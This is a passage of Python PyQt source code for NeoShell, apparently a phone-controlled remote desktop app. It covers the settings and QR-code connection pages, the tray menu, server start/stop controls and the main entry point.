        content_layout.addStretch()

        save_btn = QPushButton("SAVE SETTINGS")
        save_btn.setFixedSize(310, 55)
        save_btn.setCursor(Qt.CursorShape.PointingHandCursor)
        save_btn.clicked.connect(self._save_settings)
        save_btn.setStyleSheet("""
            QPushButton {
                background: #ffcc00;
                color: #0A0A0C;
                border-radius: 18px;
                font-weight: 800;
                font-size: 13px;
                letter-spacing: 1px;
                border: none;
            }
            QPushButton:hover {
                background: #e6b800;
            }
        """)
        content_layout.addWidget(save_btn, alignment=Qt.AlignmentFlag.AlignCenter)

        layout.addWidget(content)
        return page

    def _create_qr_page(self):
        page = QWidget()
        page.setStyleSheet("background: transparent;")
        layout = QVBoxLayout(page)
        layout.setContentsMargins(0, 0, 0, 0)
        layout.setSpacing(0)

        header = self._create_header("ПОДКЛЮЧЕНИЕ", show_back=True)
        layout.addWidget(header)

        content = QWidget()
        content_layout = QVBoxLayout(content)
        content_layout.setContentsMargins(25, 15, 25, 25)
        content_layout.setSpacing(14)

        title = QLabel("Сканируйте QR-код")
        title.setAlignment(Qt.AlignmentFlag.AlignCenter)
        title.setStyleSheet("color: #fff; font-size: 18px; font-weight: 700; background: transparent;")
        content_layout.addWidget(title)

        subtitle = QLabel("Откройте NeoShell на телефоне\nи наведите камеру")
        subtitle.setAlignment(Qt.AlignmentFlag.AlignCenter)
        subtitle.setStyleSheet("color: #888; font-size: 12px; background: transparent;")
        content_layout.addWidget(subtitle)

        content_layout.addSpacing(6)

        qr_wrapper = QWidget()
        qr_wrapper.setFixedSize(230, 230)
        qr_wrapper.setStyleSheet("""
            QWidget {
                background: qlineargradient(x1:0, y1:0, x2:1, y2:1,
                    stop:0 rgba(255, 204, 0, 0.15),
                    stop:1 rgba(102, 126, 234, 0.1));
                border-radius: 28px;
                border: 2px solid rgba(255, 204, 0, 0.2);
            }
        """)
        qr_wrapper_layout = QVBoxLayout(qr_wrapper)
        qr_wrapper_layout.setContentsMargins(20, 20, 20, 20)

        self.qr_label = QLabel()
        self.qr_label.setAlignment(Qt.AlignmentFlag.AlignCenter)
        self.qr_label.setStyleSheet("background: transparent; border: none;")
        qr_wrapper_layout.addWidget(self.qr_label)

        qr_wrapper_outer = QWidget()
        qr_wrapper_outer.setStyleSheet("background: transparent;")
        qr_outer_layout = QVBoxLayout(qr_wrapper_outer)
        qr_outer_layout.setContentsMargins(0, 0, 0, 0)
        qr_outer_layout.addWidget(qr_wrapper, alignment=Qt.AlignmentFlag.AlignCenter)

        content_layout.addWidget(qr_wrapper_outer)

        content_layout.addSpacing(6)

        info_card = QWidget()
        info_card.setFixedSize(310, 175)
        info_card.setStyleSheet("""
            QWidget {
                background: rgba(26, 26, 46, 0.5);
                border: 1px solid rgba(255, 255, 255, 0.06);
                border-radius: 16px;
            }
        """)
        info_layout = QVBoxLayout(info_card)
        info_layout.setContentsMargins(18, 14, 18, 14)
        info_layout.setSpacing(10)

        ip_row = QHBoxLayout()
        ip_label = QLabel("IP:")
        ip_label.setFixedWidth(64)
        ip_label.setStyleSheet("color: #888; font-size: 12px; font-weight: 600; background: transparent; border: none;")
        ip_row.addWidget(ip_label)
        self.ip_value = QLabel("—")
        self.ip_value.setStyleSheet("color: #ffcc00; font-size: 13px; font-family: monospace; font-weight: 600; background: transparent; border: none;")
        self.ip_value.setTextInteractionFlags(Qt.TextInteractionFlag.TextSelectableByMouse)
        ip_row.addWidget(self.ip_value)
        ip_row.addStretch()
        info_layout.addLayout(ip_row)

        port_row = QHBoxLayout()
        port_label = QLabel("ПОРТ:")
        port_label.setFixedWidth(64)
        port_label.setStyleSheet("color: #888; font-size: 12px; font-weight: 600; background: transparent; border: none;")
        port_row.addWidget(port_label)
        self.port_value = QLabel("—")
        self.port_value.setStyleSheet("color: #ffcc00; font-size: 13px; font-family: monospace; font-weight: 600; background: transparent; border: none;")
        self.port_value.setTextInteractionFlags(Qt.TextInteractionFlag.TextSelectableByMouse)
        port_row.addWidget(self.port_value)
        port_row.addStretch()
        info_layout.addLayout(port_row)

        key_row = QHBoxLayout()
        key_label2 = QLabel("КЛЮЧ:")
        key_label2.setFixedWidth(64)
        key_label2.setStyleSheet("color: #888; font-size: 12px; font-weight: 600; background: transparent; border: none;")
        key_row.addWidget(key_label2)
        self.key_value = QLabel("—")
        self.key_value.setStyleSheet("color: #10B981; font-size: 13px; font-family: monospace; font-weight: 600; background: transparent; border: none;")
        self.key_value.setTextInteractionFlags(Qt.TextInteractionFlag.TextSelectableByMouse)
        key_row.addWidget(self.key_value)
        key_row.addStretch()
        info_layout.addLayout(key_row)

        link_row = QHBoxLayout()
        link_label = QLabel("ССЫЛКА:")
        link_label.setFixedWidth(64)
        link_label.setStyleSheet("color: #888; font-size: 12px; font-weight: 600; background: transparent; border: none;")
        link_row.addWidget(link_label)
        self.link_value = QLabel("—")
        self.link_value.setStyleSheet("color: #667eea; font-size: 12px; font-family: monospace; text-decoration: underline; background: transparent; border: none;")
        self.link_value.setCursor(Qt.CursorShape.PointingHandCursor)
        self.link_value.mousePressEvent = lambda e: self._open_browser()
        link_row.addWidget(self.link_value)
        link_row.addStretch()
        info_layout.addLayout(link_row)

        info_outer = QWidget()
        info_outer.setStyleSheet("background: transparent;")
        info_outer_layout = QVBoxLayout(info_outer)
        info_outer_layout.setContentsMargins(0, 0, 0, 0)
        info_outer_layout.addWidget(info_card, alignment=Qt.AlignmentFlag.AlignCenter)

        content_layout.addWidget(info_outer)

        content_layout.addStretch()

        layout.addWidget(content)

        self.stacked.currentChanged.connect(self._on_page_changed)

        return page

    def _on_page_changed(self, index):
        if index == 2:
            self._update_qr()

    def _update_qr(self):
        if server_running:
            ip = get_local_ip()
            self.ip_value.setText(ip)
            self.port_value.setText(str(PORT))
            self.key_value.setText(SECRET_KEY)
            self.link_value.setText(f"http://{ip}:{PORT}")

            qr_data = f"NEOSHELL://{ip}:{PORT}?key={SECRET_KEY}"
            qr = qrcode.make(qr_data)
            buffer = BytesIO()
            qr.save(buffer, format='PNG')
            buffer.seek(0)
            pixmap = QPixmap()
            pixmap.loadFromData(buffer.getvalue())
            pixmap = pixmap.scaled(185, 185, Qt.AspectRatioMode.KeepAspectRatio, Qt.TransformationMode.SmoothTransformation)
            self.qr_label.setPixmap(pixmap)
        else:
            self.ip_value.setText("—")
            self.port_value.setText("—")
            self.key_value.setText("—")
            self.link_value.setText("—")
            self.qr_label.setText("START SERVER\nTO SEE QR")
            self.qr_label.setStyleSheet("color: #ffcc00; font-size: 13px; background: transparent; border: none;")
            self.qr_label.setAlignment(Qt.AlignmentFlag.AlignCenter)

    def _open_browser(self):
        if server_running:
            ip = get_local_ip()
            url = f"http://{ip}:{PORT}"
            QDesktopServices.openUrl(QUrl(url))

    def _browse_folder(self):
        folder = QFileDialog.getExistingDirectory(self, "Select Apps Folder")
        if folder:
            self.apps_input.setText(folder)

    def _save_settings(self):
        try:
            config["port"] = int(self.port_input.text())
            config["secret_key"] = self.key_input.text()
            config["apps_path"] = self.apps_input.text()
            config["auto_start"] = self.auto_start_cb.isChecked()
            config["auto_start_server"] = self.auto_server_cb.isChecked()
            save_config(config)

            global PORT, SECRET_KEY, APPS_DIR
            PORT = config["port"]
            SECRET_KEY = config["secret_key"]
            APPS_DIR = Path(config["apps_path"])
            APPS_DIR.mkdir(parents=True, exist_ok=True)

            if config["auto_start"]:
                add_to_startup()
            else:
                remove_from_startup()

            subprocess.Popen([sys.executable])
            QApplication.quit()
        except:
            pass

    def _update_tray_icon(self):
        if server_running:
            color_rgb = (16, 185, 129)
            color_hex = "#10B981"
        else:
            color_rgb = (255, 204, 0)
            color_hex = "#ffcc00"

        if ICON_PATH.exists():
            icon = recolor_icon(ICON_PATH, color_rgb)
            if icon:
                self.tray_icon.setIcon(icon)
                return

        img = Image.new('RGBA', (64, 64), (0, 0, 0, 0))
        draw = ImageDraw.Draw(img)
        draw.ellipse((8, 8, 56, 56), fill=color_hex)
        draw.text((25, 20), "N", fill='#0A0A0C')
        output = BytesIO()
        img.save(output, format='PNG')
        output.seek(0)
        pixmap = QPixmap()
        pixmap.loadFromData(output.getvalue())
        self.tray_icon.setIcon(QIcon(pixmap))

    def _update_status(self):
        global server_running
        if server_running:
            self.status_label.setText("SERVER RUNNING")
            self.status_label.setStyleSheet("color: #10B981; font-size: 13px; font-weight: 700; letter-spacing: 2px; background: transparent; margin-top: 20px;")
            self.status_info.setText(f"Доступен на {get_local_ip()}:{PORT}")
            self.status_info.setStyleSheet("color: #666; font-size: 11px; background: transparent; margin-top: 6px;")

            self.main_btn.setText("STOP SERVER")
            self.main_btn.setStyleSheet("""
                QPushButton {
                    background: rgba(239, 68, 68, 0.15);
                    color: #EF4444;
                    border-radius: 18px;
                    font-weight: 800;
                    font-size: 13px;
                    letter-spacing: 1px;
                    border: 2px solid rgba(239, 68, 68, 0.3);
                }
                QPushButton:hover {
                    background: #EF4444;
                    color: #fff;
                    border-color: #EF4444;
                }
            """)
            self.connect_btn.setVisible(True)
            self.logo.start_glow()
        else:
            self.status_label.setText("SERVER STOPPED")
            self.status_label.setStyleSheet("color: #ff4444; font-size: 13px; font-weight: 700; letter-spacing: 2px; background: transparent; margin-top: 20px;")
            self.status_info.setText("Нажмите START чтобы запустить")
            self.status_info.setStyleSheet("color: #666; font-size: 11px; background: transparent; margin-top: 6px;")

            self.main_btn.setText("START SERVER")
            self.main_btn.setStyleSheet("""
                QPushButton {
                    background: #121214;
                    color: #ffcc00;
                    border-radius: 18px;
                    font-weight: 800;
                    font-size: 13px;
                    letter-spacing: 1px;
                    border: 2px solid #ffcc00;
                }
                QPushButton:hover {
                    background: #ffcc00;
                    color: #0A0A0C;
                }
            """)
            self.connect_btn.setVisible(False)
            self.logo.stop_glow()

        self._update_tray_icon()

    def _auto_start_server(self):
        global server_running, server_thread
        if not server_running:
            open_firewall_port(PORT)
            server_thread = threading.Thread(target=start_server, daemon=True)
            server_thread.start()

    def _toggle_server(self):
        global server_running, server_thread
        if not server_running:
            self.main_btn.setText("STARTING...")
            open_firewall_port(PORT)
            server_thread = threading.Thread(target=start_server, daemon=True)
            server_thread.start()
        else:
            self.main_btn.setText("STOPPING...")
            stop_server()

    def _setup_tray(self):
        if ICON_PATH.exists():
            icon = recolor_icon(ICON_PATH, (255, 204, 0))
            if icon:
                self.tray_icon = QSystemTrayIcon(self)
                self.tray_icon.setIcon(icon)
            else:
                self.tray_icon = QSystemTrayIcon(self)
                self.tray_icon.setIcon(get_default_icon())
        else:
            self.tray_icon = QSystemTrayIcon(self)
            self.tray_icon.setIcon(get_default_icon())

        tray_menu = QMenu()
        tray_menu.setStyleSheet("""
            QMenu { background: #0A0A0C; color: #ffcc00; border: 1px solid #ffcc00; }
            QMenu::item:selected { background: #ffcc00; color: #0A0A0C; }
        """)

        show_action = QAction("Show Window", self)
        show_action.triggered.connect(self._show_window)
        tray_menu.addAction(show_action)

        start_action = QAction("Start Server", self)
        start_action.triggered.connect(self._auto_start_server)
        tray_menu.addAction(start_action)

        stop_action = QAction("Stop Server", self)
        stop_action.triggered.connect(stop_server)
        tray_menu.addAction(stop_action)

        tray_menu.addSeparator()

        exit_action = QAction("Exit", self)
        exit_action.triggered.connect(QApplication.quit)
        tray_menu.addAction(exit_action)

        self.tray_icon.setContextMenu(tray_menu)
        self.tray_icon.activated.connect(self._on_tray_activate)
        self.tray_icon.show()

    def _on_tray_activate(self, reason):
        if reason == QSystemTrayIcon.ActivationReason.Trigger:
            self._show_window()

    def _show_window(self):
        self.showNormal()
        self.activateWindow()
        self.raise_()

    def paintEvent(self, e):
        p = QPainter(self)
        p.setRenderHint(QPainter.RenderHint.Antialiasing)
        path = QPainterPath()
        path.addRoundedRect(1.0, 1.0, float(self.width() - 2), float(self.height() - 2), 25.0, 25.0)
        p.fillPath(path, QColor("#0A0A0C"))
        p.strokePath(path, QPen(QColor("#ffcc00"), 2))

    def mousePressEvent(self, e):
        if e.button() == Qt.MouseButton.LeftButton and e.pos().y() <= 60:
            self._drag_pos = e.globalPosition().toPoint() - self.frameGeometry().topLeft()

    def mouseMoveEvent(self, e):
        if self._drag_pos is not None:
            self.move(e.globalPosition().toPoint() - self._drag_pos)

    def mouseReleaseEvent(self, e):
        self._drag_pos = None

    def closeEvent(self, e):
        e.ignore()
        self.hide()


def main():
    os.environ["QT_ENABLE_HIGHDPI_SCALING"] = "1"
    os.environ["QT_SCALE_FACTOR_ROUNDING_POLICY"] = "PassThrough"

    if sys.platform == "win32":
        try:
            ctypes.windll.shell32.SetCurrentProcessExplicitAppUserModelID("neoshell.remote.desktop")
        except:
            pass

    threading.Thread(target=check_for_updates, daemon=True).start()

    app = QApplication(sys.argv)
    app.setQuitOnLastWindowClosed(False)
    app.setStyle("Fusion")

    kill_process_on_port(PORT)

    window = NeoShell()

    hidden_mode = len(sys.argv) > 1 and sys.argv[1] == '--hidden'
    if not hidden_mode:
        window.show()

    sys.exit(app.exec())


if __name__ == "__main__":
    main()
